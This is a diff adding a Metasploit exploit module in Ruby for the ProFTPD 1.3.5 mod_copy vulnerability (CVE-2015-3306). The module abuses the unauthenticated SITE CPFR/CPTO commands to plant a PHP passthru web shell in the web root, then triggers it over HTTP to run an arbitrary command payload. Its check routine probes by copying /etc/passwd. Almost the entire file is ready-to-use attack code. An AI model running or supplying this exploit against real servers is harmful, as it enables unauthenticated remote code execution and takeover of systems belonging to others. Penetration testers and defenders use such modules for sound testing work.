@@ -1,0 +1,148 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'ProFTPD 1.3.5 Mod_Copy Command Execution',
+      'Description'    => %q{
+          This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5.
+          Any unauthenticated client can leverage these commands to copy files from any
+          part of the filesystem to a chosen destination. The copy commands are executed with
+          the rights of the ProFTPD service, which by default runs under the privileges of the
+          'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website
+          directory, PHP remote code execution is made possible.
+      },
+      'Author'         =>
+        [
+          'Vadim Melihow', # Original discovery, Proof of Concept
+          'xistence <xistence[at]0x90.nl>' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2015-3306' ],
+          [ 'EDB', '36742' ]
+        ],
+      'Privileged'     => false,
+      'Platform'       => [ 'unix' ],
+      'Arch'           => ARCH_CMD,
+      'Payload'        =>
+        {
+          'BadChars' => '',
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic gawk bash python perl'
+            }
+        },
+      'Targets'        =>
+        [
+          [ 'ProFTPD 1.3.5', { } ]
+        ],
+      'DisclosureDate' => 'Apr 22 2015',
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        OptPort.new('RPORT', [true, 'HTTP port', 80]),
+        OptPort.new('RPORT_FTP', [true, 'FTP port', 21]),
+        OptString.new('TARGETURI', [true, 'Base path to the website', '/']),
+        OptString.new('TMPPATH', [true, 'Absolute writable path', '/tmp']),
+        OptString.new('SITEPATH', [true, 'Absolute writable website path', '/var/www'])
+      ], self.class)
+  end
+
+  def check
+    ftp_port = datastore['RPORT_FTP']
+    sock = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => ftp_port)
+
+    if sock.nil?
+      fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP server")
+    else
+      print_status("#{rhost}:#{ftp_port} - Connected to FTP server")
+    end
+
+    res = sock.get_once(-1, 10)
+    unless res && res.include?('220')
+      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure retrieving ProFTPD 220 OK banner")
+    end
+
+    sock.puts("SITE CPFR /etc/passwd\r\n")
+    res = sock.get_once(-1, 10)
+    if res && res.include?('350')
+      Exploit::CheckCode::Vulnerable
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    ftp_port = datastore['RPORT_FTP']
+    get_arg = rand_text_alphanumeric(5+rand(3))
+    payload_name = rand_text_alphanumeric(5+rand(3)) + '.php'
+
+    sock = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => ftp_port)
+
+    if sock.nil?
+      fail_with(Failure::Unreachable, "#{rhost}:#{ftp_port} - Failed to connect to FTP server")
+    else
+      print_status("#{rhost}:#{ftp_port} - Connected to FTP server")
+    end
+
+    res = sock.get_once(-1, 10)
+    unless res && res.include?('220')
+      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure retrieving ProFTPD 220 OK banner")
+    end
+
+    print_status("#{rhost}:#{ftp_port} - Sending copy commands to FTP server")
+
+    sock.puts("SITE CPFR /proc/self/cmdline\r\n")
+    res = sock.get_once(-1, 10)
+    unless res && res.include?('350')
+      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying from /proc/self/cmdline")
+    end
+
+    sock.put("SITE CPTO #{datastore['TMPPATH']}/.<?php passthru($_GET[\'#{get_arg}\']);?>\r\n")
+    res = sock.get_once(-1, 10)
+    unless res && res.include?('250')
+      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying to temporary payload file")
+    end
+
+    sock.put("SITE CPFR #{datastore['TMPPATH']}/.<?php passthru($_GET[\'#{get_arg}\']);?>\r\n")
+    res = sock.get_once(-1, 10)
+    unless res && res.include?('350')
+      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying from temporary payload file")
+    end
+
+    sock.put("SITE CPTO #{datastore['SITEPATH']}/#{payload_name}\r\n")
+    res = sock.get_once(-1, 10)
+    unless res && res.include?('250')
+      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure copying PHP payload to website path, directory not writable?")
+    end
+
+    sock.close
+
+    print_status("#{peer} - Executing PHP payload #{target_uri.path}#{payload_name}")
+    res = send_request_cgi!(
+      'uri' => normalize_uri(target_uri.path, payload_name),
+      'method' => 'GET',
+      'vars_get' => { get_arg => "nohup #{payload.encoded} &" }
+    )
+
+    unless res && res.code == 200
+      fail_with(Failure::Unknown, "#{rhost}:#{ftp_port} - Failure executing payload")
+    end
+  end
+
+end
